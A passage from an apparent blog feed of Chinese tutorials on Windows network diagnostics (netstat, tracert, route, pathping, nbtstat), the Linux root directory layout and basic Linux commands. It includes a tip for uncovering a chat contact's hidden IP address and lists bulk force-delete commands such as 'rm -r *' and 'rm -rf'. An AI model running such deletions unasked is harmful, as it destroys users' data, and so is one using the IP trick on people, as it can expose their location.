<code>netstat –s</code>：本选项能够按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。</p><p>▧ <code>netstat –e</code>：本选项用于显示关于以太网的统计数据。它列出的项目包括传送的数据报的总字节数、错误数、删除数、数据报的数量和广播的数量。这些统计数据既有发送的数据报数量，也有接收的数据报数量。这个选项可以用来统计一些基本的网络流量）。</p><p>▧ <code>netstat –r</code>：本选项可以显示关于路由表的信息，类似于后面所讲使用route print命令时看到的信息。除了显示有效路由外，还显示当前有效的连接。</p><p>▧ <code>netstat –a</code>：本选项显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请求（LISTENING）的那些连接。</p><p>▧ <code>netstat –n</code>：显示所有已建立的有效连接。</p><font color="navy">**2.Netstat的妙用**</font><p>经常上网的人一般都使用QQ的，不会遇到被一些讨厌的人骚扰，想投诉却又不知从何下手的情况。其实，我们只要知道对方的IP，就可以向他所属的ISP投诉了。但如果对方在设置QQ时选择了不显示IP地址，那我们是无法在信息栏中看到的。我们只需要通过Netstat就可以很方便的做到这一点：当他通过QQ或其他的工具与我们相连时（例如我们给他发一条QQ信息或他给我们发一条信息），我们立刻在DOS命令提示符下输入netstat -n或netstat -a就可以看到对方上网时所用的IP或ISP域名了，甚至连所用Port都完全暴露了。</p><h3 id="0x04-tracert"><a href="#0x04-tracert" class="headerlink" title="0x04 tracert"></a><font color="brown">0x04 tracert</font></h3><blockquote><p>使用tracert跟踪网络连接。如果有网络连通性问题，可以使用 tracert 命令来检查到达的目标IP地址的路径并记录结果。tracert命令显示用于将数据包从计算机传递到目标位置的一组 IP 路由器，以及每个跃点所需的时间。如果数据包不能传递到目标，tracert命令将显示成功转发数据包的最后一个路由器。当数据报从我们的计算机经过多个网关传送到目的地时，Tracert命令可以用来跟踪数据报使用的路由（路径）。该实用程序跟踪的路径是源计算机到目的地的一条路径，不能保证或认为数据报总遵循这个路径。如果我们的配置使用DNS，那么我们常常会从所产生的应答中得到城市、地址和常见通信公司的名字。Tracert是一个运行得比较慢的命令（如果我们指定的目标地址比较远），每个路由器我们大约需要给它15秒钟。</p></blockquote><p>Tracert的使用很简单，只需要在tracert后面跟一个IP地址或URL，Tracert会进行相应的域名转换的。Tracert 实用程序对于解决大网络问题非常有用，此时可以采取几条路径到达同一个点。</p><font color="navy">**tracert 最常见的用法**：</font><p>▧ <code>tracert IP address [-d]</code>该命令返回到达 IP 地址所经过的路由器列表。通过使用 -d 选项，将更快地显示路由器路径，因为 tracert 不会尝试解析路径中路由器的名称。</p><blockquote><p>说明：通过向目标发送不同 IP 生存时间 (TTL) 值的“Internet 控制消息协议 (ICMP)”回应数据包，Tracert 诊断程序确定到目标所采取的路由。要求路径上的每个路由器在转发数据包之前至少将数据包上的 TTL 递减 1。数据包上的 TTL 减为 0 时，路由器应该将“ICMP 已超时”的消息发回源系统。Tracert 先发送 TTL 为 1 的回应数据包，并在随后的每次发送过程将 TTL 递增 1，直到目标响应或 TTL 达到最大值，从而确定路由。通过检查中间路由器发回的“ICMP 已超时”的消息确定路由。某些路由器不经询问直接丢弃 TTL 过期的数据包，这在Tracert 实用程序中看不到。 Tracert 命令按顺序打印出返回“ICMP 已超时”消息的路径中的近端路由器接口列表。如果使用 <code>-d</code> 选项，则 Tracert 实用程序不在每个 IP 地址上查询 DNS。</p></blockquote><p>Tracert 命令行选项：Tracert 命令支持多种选项，如下表所示：</p><p><code>tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name</code></p><font color="navy">**选项描述：**</font><ul><li><p>-d 指定不将 IP 地址解析到主机名称。 </p></li><li><p>-h maximum_hops 指定跃点数以跟踪到称为 target_name 的主机的路由。 </p></li><li><p>-j host-list 指定 Tracert 实用程序数据包所采用路径中的路由器接口列表。 </p></li><li><p>-w timeout 等待 timeout 为每次回复所指定的毫秒数。 </p></li><li><p>target_name 目标主机的名称或 IP地址。 </p></li></ul><h3 id="0x05-route"><a href="#0x05-route" class="headerlink" title="0x05 route"></a><font color="brown">0x05 route</font></h3><blockquote><p>大多数主机一般都是驻留在只连接一台路由器的网段上。由于只有一台路由器，因此不存在使用哪一台路由器将数据报发表到远程计算机上去的问题，该路由器的IP地址可作为该网段上所有计算机的缺省网关来输入。但是，当网络上拥有两个或多个路由器时，我们就不一定想只依赖缺省网关了。实际上我们可能想让我们的某些远程IP地址通过某个特定的路由器来传递，而其他的远程IP则通过另一个路由器来传递。在这种情况下，我们需要相应的路由信息，这些信息储存在路由表中，每个主机和每个路由器都配有自己独一无二的路由表。大多数路由器使用专门的路由协议来交换和动态更新路由器之间的路由表。但在有些情况下，必须人工将项目添加到路由器和主机上的路由表中。Route就是用来显示、人工添加和修改路由表项目的。</p></blockquote><p>一般使用选项：</p><p>▧ <code>route print</code>：本命令用于显示路由表中的当前项目，在单路由器网段上的输出；由于用IP地址配置了网卡，因此所有的这些项目都是自动添加的。</p><p>▧ <code>route add</code>：使用本命令，可以将信路由项目添加给路由表。例如，如果要设定一个到目的网络<code>209.98.32.33</code>的路由，其间要经过5个路由器网段，首先要经过本地网络上的一个路由器，器IP为<code>202.96.123.5</code>，子网掩码为<code>255.255.255.224</code>，那么我们应该输入以下命令：<code>route add 209.98.32.33 mask 255.255.255.224 202.96.123.5 metric 5</code></p><p>▧ <code>route change</code>：我们可以使用本命令来修改数据的传输路由，不过，我们不能使用本命令来改变数据的目的地。下面这个例子可以将数据的路由改到另一个路由器，它采用一条包含3个网段的更直的路径：<code>route add 209.98.32.33 mask 255.255.255.224 202.96.123.250 metric 3</code></p><p>▧ <code>route delete</code>：使用本命令可以从路由表中删除路由。例如：<code>route delete 209.98.32.33</code>。</p><h3 id="0x06-pathping"><a href="#0x06-pathping" class="headerlink" title="0x06 pathping"></a><font color="brown">0x06 pathping</font></h3><p>使用 pathping 测试路由器。pathping 命令是一个路由跟踪工具，它将 ping 和 tracert 命令的功能和这两个工具所不提供的其他信息结合起来。pathping 命令在一段时间内将数据包发送到到达最终目标的路径上的每个路由器，然后基于数据包的计算机结果从每个跃点返回。由于命令显示数据包在任何给定路由器或链接上丢失的程度，因此可以很容易地确定可能导致网络问题的路由器或链接。某些选项是可用的，如下表所示。 </p><div class="table-container"><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">名称</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">-n</td><td style="text-align:center">Hostnames</td><td style="text-align:center">不将地址解析成主机名</td></tr><tr><td style="text-align:center">-h</td><td style="text-align:center">Maximum hops</td><td style="text-align:center">搜索目标的最大跃点数</td></tr><tr><td style="text-align:center">-g</td><td style="text-align:center">Host-list</td><td style="text-align:center">沿着路由列表释放源路由</td></tr><tr><td style="text-align:center">-p</td><td style="text-align:center">Period</td><td style="text-align:center">在 ping 之间等待的毫秒数</td></tr><tr><td style="text-align:center">-q</td><td style="text-align:center">Num_queries</td><td style="text-align:center">每个跃点的查询数</td></tr><tr><td style="text-align:center">-w</td><td style="text-align:center">Time-out</td><td style="text-align:center">为每次回复所等待的毫秒数</td></tr><tr><td style="text-align:center">-T</td><td style="text-align:center">Layer 2 tag</td><td style="text-align:center">将第 2 层优先级标记</td></tr><tr><td style="text-align:center">-R</td><td style="text-align:center">RSVP isbase Che</td><td style="text-align:center">检查路径中的路由器是否支持“资源保留协议”,允许主机为数据流保留一定量带宽</td></tr></tbody></table></div><blockquote><p>对于<code>-T</code>:（例如，对于 IEEE 802.1p）连接到数据包并将它发送到路径中的每个网络设备。这有助于标识没有正确配置第 2 层优先级的网络设备。-T 开关用于测试服务质量 (QoS) 连通性。 </p><p>对于<code>-R</code>： 开关用于测试服务质量 (QoS) 连通性。 </p></blockquote><p>==默认的跃点数是 30，并且超时前的默认等待时间是 3 秒。默认时间是 250 毫秒，并且沿着路径对每个路由器进行查询的次数是 100。== </p><p><strong>当运行 pathping 时，在测试问题时首先查看路由的结果</strong>。此路径与 tracert 命令所显示的路径相同。然后 pathping 命令对下一个 125 毫秒显示忙消息（此时间根据跃点计数变化）。在此期间，pathping 从以前列出的所有路由器和它们之间的链接之间收集信息。在此期间结束时，它显示测试结果。</p><p>最右边的两栏 This Node/Link Lost/Sent=Pct 和 Address 包含的信息最有用。172.16.87.218（跃点 1）和 192.68.52.1（跃点 2）丢失 13% 的数据包。 所有其他链接工作正常。在跃点 2 和 4 中的路由器也丢失寻址到它们的数据包（如 This Node /Link 栏中所示），但是该丢失不会影响转发的路径。</p><p>对链接显示的丢失率（在最右边的栏中标记为 |）表明沿路径转发丢失的数据包。该丢失表明链接阻塞。对路由器显示的丢失率（通过最右边栏中的 IP 地址显示）表明这些路由器的 CPU 可能超负荷运行。这些阻塞的路由器可能也是端对端问题的一个因素，尤其是在软件路由器转发数据包时。</p><h3 id="0x07-NBTStat"><a href="#0x07-NBTStat" class="headerlink" title="0x07 NBTStat"></a><font color="brown">0x07 NBTStat</font></h3><p>使用 nbtstat 命令释放和刷新 NetBIOS 名称。NBTStat（TCP/IP上的NetBIOS统计数据）实用程序用于提供关于NetBIOS的统计数据。运用NetBIOS，我们可以查看本地计算机或远程计算机上的NetBIOS名字表格。</p><font color="navy">**常用选项**：</font><ul><li><p><code>nbtstat –n</code>：显示寄存在本地的名字和服务程序。</p></li><li><p><code>nbtstat –c</code>：本命令用于显示NetBIOS名字高速缓存的内容。NetBIOS名字高速缓存用于存放与本计算机最近进行通信的其他计算机的NetBIOS名字和IP地址对。</p></li><li><p><code>nbtstat –r</code>：本命令用于清除和重新加载NetBIOS名字高速缓存。</p></li><li><p><code>nbtstat -a IP</code>：通过IP显示另一台计算机的物理地址和名字列表，我们所显示的内容就像对方计算机自己运行nbtstat -n一样。</p></li><li><p><code>nbtstat -s IP</code>：显示实用其IP地址的另一台计算机的NetBIOS连接表。</p></li></ul><p>例如我们在命令提示符下，键入：nbtstat –RR 释放和刷新过程的进度以命令行输出的形式显示。该信息表明当前注册在该计算机的 WINS 中的所有本地 NetBIOS 名称是否已经使用 WINS 服务器释放和续订了注册。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-ipconfig&quot;&gt;&lt;a href=&quot;#0x00-ipconfig&quot; class=&quot;headerlink&quot; title=&quot;0x00 ipconfig&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;0x00 ipconfig&lt;/font&gt;&lt;/h3&gt;&lt;d
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Linux-根目录详解（二进制）</title>
    <link href="https://muzibing.github.io/2020/03/21/2020.03.21%EF%BC%88105%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/21/2020.03.21（105）/</id>
    <published>2020-03-20T16:00:00.000Z</published>
    <updated>2020-03-30T12:40:11.158Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的，同时根目录也与开机/还原/系统修复等动作有关。因此FHS标准<strong>建议</strong>： <strong>根目录(/)所在分区应该越小越好</strong>，且应用程式所安装的软体最好不要与根目录放在同一个分区内，以保持根目录越小越好。 如此不但效能较佳，根目录所在的文件系统也较不容易发生问题。</p><p>说白了，就是根目录和Windows的C盘一个样</p></blockquote><h3 id="1-根目录下各个目录的功能"><a href="#1-根目录下各个目录的功能" class="headerlink" title="1.根目录下各个目录的功能"></a><font color="navy">1.根目录下各个目录的功能</font></h3><h4 id="详细列表"><a href="#详细列表" class="headerlink" title="详细列表"></a><code>详细列表</code></h4><div class="table-container"><table><thead><tr><th>目录</th><th>应放置档案内容</th><th>说明</th><th><strong>备注</strong></th></tr></thead><tbody><tr><td>/bin</td><td>系统有很多放置执行档的目录，但/bin比较特殊。因为/bin放置的是在单人维护模式[quest-?]下还能够被操作的指令。在/bin底下的指令可以被root与一般帐号所使用，主要有：cat, <a href="http://hi.baidu.com/haifengjava/blog/item/e540a894c0f36a1bd21b70d1.html" target="_blank" rel="noopener">chmod(修改权限)</a>, chown, date, mv, mkdir, cp, bash等等常用的指令。</td><td>存放普通用户可执行的指令</td><td>即使在单用户模式下也能够执行处理</td></tr><tr><td>/boot</td><td>主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。 Linux kernel常用的档名为：<strong>vmlinuz</strong> ，如果使用的是grub这个开机管理程式，则还会存在<strong>/boot/grub/</strong>这个目录！</td><td>开机引导目录</td><td>包括Linux内核文件与开机所需要的文件</td></tr><tr><td>/dev</td><td>在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有/dev/null, /dev/zero, /dev/tty , /dev/lp*, / dev/hd*, /dev/sd*等等</td><td>设备目录</td><td>所有的硬件设备及周边均放置在这个设备目录中</td></tr><tr><td>/etc</td><td>系统主要的设定档几乎都放置在这个目录内，例如人员的帐号密码档、各种服务的启始档等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，<strong>但</strong>是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有： /etc/inittab, /etc/init.d/, /etc/modprobe.conf, /etc/X11/, /etc/fstab, /etc/sysconfig/等等。 另外，其下重要的目录有：<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>/etc/init.d/</strong> ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话：『 /etc/init.d/iptables start』、『/etc/init.d/ iptables stop』<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>/etc/xinetd.d/</strong> ：这就是所谓的super daemon管理的各项服务的设定档目录。<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>/etc/X11/</strong> ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。</td><td>各种配置文件目录</td><td>大部分配置属性均存放在这里</td></tr><tr><td>/home</td><td>这是系统预设的使用者家目录(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号： ~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录！</td><td></td><td></td></tr><tr><td>/lib</td><td>系统的函式库非常的多，而/lib放置的则是在开机时会用到的函式库，以及在/bin或/sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？你可以将他想成是『外挂』，某些指令必须要有这些『外挂』才能够顺利完成程式的执行之意。 <strong>尤其重要</strong>的是/lib/modules/这个目录，因为该目录会放置核心相关的模组(驱动程式)喔！</td><td>开机时常用的动态链接库</td><td>bin及sbin指令也会调用对应的lib库</td></tr><tr><td>/media</td><td>media是『媒体』的英文，顾名思义，这个/media底下放置的就是可移除的装置啦！ 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：/media/floppy, /media/cdrom等等。</td><td>可移除设备挂载目录</td><td>类似软盘 U盘 光盘等临时挂放目录</td></tr><tr><td>/mnt</td><td>如果妳想要暂时挂载某些额外的装置，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与/media相同啦！ 只是有了/media之后，这个目录就用来暂时挂载用了</td><td>用户临时挂载其他的文件系统</td><td>额外的设备可挂载在这里,相对临时而言</td></tr><tr><td>/opt</td><td>这个是给第三方协力软体放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，<strong>以前的Linux系统中，我们还是习惯放置在/usr/local目录下</strong>！</td><td>第三方软件安装目录</td><td>现在习惯性的放置在/usr/local中</td></tr><tr><td>/root</td><td>系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。</td><td>系统管理员主目录</td><td>除root之外,其他用户均放置在/home目录下</td></tr><tr><td>/sbin</td><td>Linux有非常多指令是用来设定系统环境的，这些指令<strong>只有</strong>root才能够利用来『设定』系统，<strong><em>\</em>其他**</strong>使用者最多只能用来『查询』而已。放在/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到/usr/sbin/当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到/usr/local/sbin/当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。</td><td>只有root才能运行的管理指令</td><td>跟bin类似,但只属于root管理员</td></tr><tr><td>/srv</td><td>srv可以视为『service』的缩写，是一些网路服务启动之后，这些服务所需要取用的资料目录。 常见的服务例如WWW, FTP等等。 举例来说，WWW伺服器需要的网页资料就可以放置在/srv/www/里面。呵呵，看来平时我们编写的代码应该放到这里了。</td><td>服务启动后需要访问的数据目录</td><td></td></tr><tr><td>/tmp</td><td>这是让一般使用者或者是正在执行的程序暂时放置档案的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊！ 因为FHS甚至建议在开机时，应该要将/tmp下的资料都删除！</td><td>存放临时文件目录</td><td>所有用户对该目录均可读写</td></tr></tbody></table></div><h3 id="2-根目录下的结构"><a href="#2-根目录下的结构" class="headerlink" title="2.根目录下的结构"></a><font color="brown">2.根目录下的结构</font></h3><h4 id="tree-命令"><a href="#tree-命令" class="headerlink" title="tree 命令"></a><code>tree 命令</code></h4><blockquote><p>使用tree 可以查看详细的目录树</p></blockquote><h4 id="根目录下的结构图"><a href="#根目录下的结构图" class="headerlink" title="根目录下的结构图"></a><code>根目录下的结构图</code></h4><p><img src="/images/105-1.png" alt></p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a><code>注意</code></h4><blockquote><ul><li>/etc：设定档</li><li>/bin：重要执行档</li><li>/dev：所需要的装置档案</li><li>/lib：执行档所需的函式库与核心所需的模组</li><li>/sbin：重要的系统执行档</li></ul></blockquote><p>这五个目录<strong>千万不可</strong>与根目录分开在不同的分区！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的，同时根目录也与开机/还原/系统修复等动作有关。因此FHS标准&lt;strong&gt;建议&lt;/strong&gt;： &lt;strong&gt;根目录(/)所在分区应该越小越好&lt;/strong&gt;，且
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
      <category term="Linux" scheme="https://muzibing.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux常用命令总结（二进制）</title>
    <link href="https://muzibing.github.io/2020/03/20/2020.03.20%EF%BC%88104%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/20/2020.03.20（104）/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-30T12:40:17.234Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-目录操作命令"><a href="#0x00-目录操作命令" class="headerlink" title="0x00 目录操作命令"></a><font color="brown"><code>0x00 目录操作命令</code></font></h3><h4 id="0x00-ls（list）"><a href="#0x00-ls（list）" class="headerlink" title="0x00 ls（list）"></a><font color="navy"><code>0x00 ls（list）</code></font></h4><p><code>功能</code>：列举出当前工作目录的内容，包括文件和文件夹</p><p><code>相关选项</code>：</p><blockquote><p><code>ls -l</code>： 文件/文件夹：长格式显示指定/目录中的文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@# ls -l 图片1.png</span><br><span class="line">-rwxrwxrwx   1      root  root 43531 Mar 16 13:02 图片1.png</span><br><span class="line">   权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br><span class="line">   </span><br><span class="line">root@# ls -l 文件夹</span><br><span class="line">-rwxrwxrwx 1 root root  645653 Mar 18 10:25 5d0b02281396a.png</span><br><span class="line">-rwxrwxrwx 1 root root 1139867 Feb 23 12:09 IMG_1074.jpg</span><br><span class="line">-rwxrwxrwx 1 root root 2282681 Feb 14 15:54 IMG_1093-2.jpg</span><br><span class="line">    权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br></pre></td></tr></table></figure><blockquote><p><code>ls -a</code>：显示所有文件，包含隐藏文件</p></blockquote><h4 id="0x01-cd（Change-Directory）"><a href="#0x01-cd（Change-Directory）" class="headerlink" title="0x01 cd（Change Directory）"></a><font color="navy"><code>0x01 cd（Change Directory）</code></font></h4><p><code>作用</code>：切换文件路径，cd 将给定的文件夹（或目录）设置成当前工作目录</p><p><code>功能</code>：</p><blockquote><p><code>cd ~</code>：进入当前用户的home目录</p><p><code>cd -</code>：进入上次目录</p><p><code>cd ..</code> ：进入上一级目录</p></blockquote><h4 id="0x02-pwd（print-working-directory）"><a href="#0x02-pwd（print-working-directory）" class="headerlink" title="0x02 pwd（print working directory）"></a><font color="navy"><code>0x02 pwd（print working directory）</code></font></h4><p><code>功能</code>：显示当前工作目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@:/mnt/d/Program# pwd</span><br><span class="line">/mnt/d/Program</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：无</p><p><code>附加知识点</code>：Linux 常见目录及作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">/ 根目录</span><br><span class="line"></span><br><span class="line">/bin 命令保存目录（普通用户就可以读取的命令）</span><br><span class="line"></span><br><span class="line">/boot 启动目录，启动相关文件</span><br><span class="line"></span><br><span class="line">/dev 设备文件保存目录</span><br><span class="line"></span><br><span class="line">/etc 配置文件保存目录</span><br><span class="line"></span><br><span class="line">/home 普通用户的家目录</span><br><span class="line"></span><br><span class="line">/lib 系统库保存目录</span><br><span class="line"></span><br><span class="line">/mnt 系统挂载目录</span><br><span class="line"></span><br><span class="line">/media 挂载目录</span><br><span class="line"></span><br><span class="line">/root 超级用户的家目录</span><br><span class="line"></span><br><span class="line">/tmp 临时目录</span><br><span class="line"></span><br><span class="line">/sbin 命令保存目录（超级用户才能使用的目录）</span><br><span class="line"></span><br><span class="line">/proc 直接写入内存的</span><br><span class="line"></span><br><span class="line">/sys 将内核的一些信息映射，可供应用程序所用</span><br><span class="line"></span><br><span class="line">/usr 系统软件资源目录</span><br><span class="line"></span><br><span class="line">/usr/bin/ 系统命令（普通用户）</span><br><span class="line"></span><br><span class="line">/usr/sbin/ 系统命令（超级用户）</span><br><span class="line"></span><br><span class="line">/var 系统相关文档内容</span><br><span class="line"></span><br><span class="line">/var/log/ 系统日志位置</span><br><span class="line"></span><br><span class="line">/var/spool/mail/系统默认邮箱位置</span><br><span class="line"></span><br><span class="line">/var/lib/ 默认安装的库文件目录</span><br></pre></td></tr></table></figure><h4 id="0x03-mkdir（make-directories）"><a href="#0x03-mkdir（make-directories）" class="headerlink" title="0x03 mkdir（make directories）"></a><font color="navy"><code>0x03 mkdir（make directories）</code></font></h4><p><code>功能</code>：用于新建一个新目录</p><p><code>相关选项</code>：</p><blockquote><p><code>mkdir test</code>：创建名为test的目录</p><p><code>mkdir -p test1/test2/test3</code>：递归创建</p></blockquote><h4 id="0x04-rmdir（remove-directories）"><a href="#0x04-rmdir（remove-directories）" class="headerlink" title="0x04 rmdir（remove directories）"></a><font color="navy"><code>0x04 rmdir（remove directories）</code></font></h4><p><code>功能</code>：删除给定的目录（只能删除空目录）</p><p><code>相关选项</code>：</p><h3 id="0x01-文件操作命令"><a href="#0x01-文件操作命令" class="headerlink" title="0x01 文件操作命令"></a><font color="brown"><code>0x01 文件操作命令</code></font></h3><h4 id="0x00-touch（touch）"><a href="#0x00-touch（touch）" class="headerlink" title="0x00 touch（touch）"></a><font color="navy"><code>0x00 touch（touch）</code></font></h4><p><code>功能</code>：创建空文件或修改文件时间</p><p><code>例子</code></p><blockquote><p><code>touch test.py</code>：创建空文件，如果文件存在，则修改文件创建时间</p></blockquote><h4 id="0x01-rm（remove）"><a href="#0x01-rm（remove）" class="headerlink" title="0x01 rm（remove）"></a><font color="navy"><code>0x01 rm（remove）</code></font></h4><p><code>功能</code>：删除给定的文件</p><p><code>相关选项</code>：</p><blockquote><p><code>rm -r 目录名</code>： 递归删除文件和目录</p><p><code>rm -r *</code>：删除当前目录下的所有文件及目录</p><p><code>rm -f 文件名</code> ： 强制删除</p><p><code>rm -rf 目录名</code>:  强制删除目录和文件</p></blockquote><h4 id="0x02-cat（concatenate-and-print-files）"><a href="#0x02-cat（concatenate-and-print-files）" class="headerlink" title="0x02 cat（concatenate and print files）"></a><font color="navy"><code>0x02 cat（concatenate and print files）</code></font></h4><p><code>功能</code>：用于在标准输出（监控器或屏幕）上查看文件内容</p><p><code>相关选项</code>：</p><blockquote><p><code>-n</code>：由 1 开始对所有输出的行数编号</p><p><code>-b</code>：和 -n 相似，只不过对于空白行不编号</p><p><code>-E</code>： 在每行结束处显示 $</p></blockquote><h4 id="0x03-more"><a href="#0x03-more" class="headerlink" title="0x03 more"></a><font color="navy"><code>0x03 more</code></font></h4><p><code>功能</code>：命令类似 cat ，不过会以一页一页的形式显示</p><p><code>相关选项</code>：</p><blockquote><p><code>空格键</code>：向上翻页</p><p><code>b</code>：向下翻页</p><p><code>p</code>：退出查看</p></blockquote><h4 id="0x04-cp（copy）"><a href="#0x04-cp（copy）" class="headerlink" title="0x04 cp（copy）"></a><font color="navy"><code>0x04 cp（copy）</code></font></h4><p><code>功能</code>：对文件或目录进行复制</p><p><code>相关选项</code>：</p><blockquote><p>cp 源文件 目标位置 (复制)</p><p>cp 源文件 目标位置/目标名称 (复制并改名)</p><p><code>cp -r test/ newtest</code> ：复制目录</p><p><code>cp -p</code>：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中</p><p><code>cp -d</code>：若源文件是链接文件，则复制链接属性</p><p><code>cp -a</code>：相当于 <code>cp -pdr</code></p></blockquote><h4 id="0x05-mv（move）"><a href="#0x05-mv（move）" class="headerlink" title="0x05 mv（move）"></a><font color="navy"><code>0x05 mv（move）</code></font></h4><p><code>功能</code>：命令对文件或文件夹进行移动，如果文件或文件夹存在于当前工作目录，还可以对文件或文件夹进行重命名</p><div class="table-container"><table><thead><tr><th style="text-align:left">命令格式</th><th style="text-align:left">运行结果</th></tr></thead><tbody><tr><td style="text-align:left">mv 文件名 文件名</td><td style="text-align:left">将源文件名改为目标文件名</td></tr><tr><td style="text-align:left">mv 文件名 目录名</td><td style="text-align:left">将文件移动到目标目录</td></tr><tr><td style="text-align:left">mv 目录名 目录名</td><td style="text-align:left">目标目录已存在，将源目录移动到目标目录；目标目录不存在则改名</td></tr><tr><td style="text-align:left">mv 目录名 文件名</td><td style="text-align:left">出错</td></tr></tbody></table></div><p><code>相关选项</code>：</p><blockquote><p><code>mv -i</code>：若指定目录已有同名文件，则先询问是否覆盖旧文件;</p><p><code>mv -f</code>：在 mv 操作要覆盖某已有的目标文件时不给任何指示;</p></blockquote><p><code>实例</code></p><p>目标目录与原目录一致，指定了新文件名，效果就是仅仅重命名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/b.txt</span><br></pre></td></tr></table></figure><p>目标目录与原目录不一致，没有指定新文件名，效果就是仅仅移动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test/ </span><br><span class="line">或者</span><br><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test</span><br></pre></td></tr></table></figure><p>目标目录与原目录不一致, 指定了新文件名，效果就是：移动 + 重命名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test/c.txt</span><br></pre></td></tr></table></figure><h4 id="0x06-cat（Catenate，连锁）"><a href="#0x06-cat（Catenate，连锁）" class="headerlink" title="0x06 cat（Catenate，连锁）"></a><font color="navy"><code>0x06 